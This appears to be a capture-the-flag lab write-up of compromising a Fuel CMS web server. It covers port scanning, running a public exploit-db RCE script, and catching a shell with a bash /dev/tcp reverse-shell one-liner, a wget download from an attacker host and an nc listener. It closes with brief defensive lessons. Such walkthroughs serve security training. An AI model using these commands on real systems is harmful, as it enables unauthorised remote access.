## We start off by enumerating open ports with Nmap
{% highlight bash %}
$  nmap -sCV x.x.x.x
{% endhighlight bash %}

## We can see that only port 80 is open and running a web server
![img]({{ '/assets/images/ignite_pics/1-ignite.png' | relative_url }}){: .center-image }
## Our output shows there is a '/robots.txt' entry showing /fuel
## Navigating here shows us a login page 
<br>

## Our Nmap scan shows that the site is using 'FUEL CMS' to run the site
## Lets search for Fuel CMS exploits on [exploit-db](https://www.exploit-db.com) 
![img]({{ '/assets/images/ignite_pics/2-ignite.png' | relative_url }}){: .center-image }


## We find an exploit that looks promising
[www.exploit-db.com/exploits/50477](https://www.exploit-db.com/exploits/50477)

## Lets save this to our machine and run the script below, specifying the target URL
{% highlight bash %}
$ python3 50477.py -u http://x.x.x.x
{% endhighlight bash %}
<br>

## We can see that RCE exploit is successful
## We can now run remote commands on the target machine
![img]({{ '/assets/images/ignite_pics/3-ignite.png' | relative_url }}){: .center-image }
<br>

## Running a few basic commands we can begin to enumerate directories and verify privilege 
![img]({{ '/assets/images/ignite_pics/4-ignite.png' | relative_url }}){: .center-image }

## We can see that we are the 'www-data' user
## Let's see if we can catch a proper shell
<br>

## I will use this bash 1-liner to create the shell
{% highlight bash %}
$ bash -i >& /dev/tcp/attacker_ip/port 0>&1
{% endhighlight bash %}
You can find the reverse shell used here and more shells at:
[pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
<br>

## We can save the script as a '.sh' file on our machine
## Now let's use 'wget' to download the script onto target machine using the RCE exploit
{% highlight bash %}
wget http://attacker_IP/pth/2/script
{% endhighlight bash %}


## We see the file was downloaded successfully
![img]({{ '/assets/images/ignite_pics/5-ignite.png' | relative_url }}){: .center-image }

## Now we can start our listener on our machine, and then run the script using the command below
{% highlight bash %}
# Attacker machine:
$ nc -lvnp <port>

# Target machine:
$ bash shell.sh 
{% endhighlight bash %}
<br>

## We now receive the shell connection on our machine !
![img]({{ '/assets/images/ignite_pics/6-ignite.png' | relative_url }}){: .center-image }


## Lets stabilize our shell with the command below:
{% highlight bash %}
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight bash %}

## We find the user flag in '/home/www-data/flag.txt'
![img]({{ '/assets/images/ignite_pics/7-ignite.png' | relative_url }}){: .center-image }
<br>
<br>

# LESSONS LEARNED

## We were able to exploit this machine due to a known Remote Code Excecution Vulnerability in the web server
## Failing to properly sanitize user input can lead to arbitrary code execution, data breaches, and system take-over
## Preventing RCE attacks requires resctictive security measures like input validation, secure coding practices, and regular updates
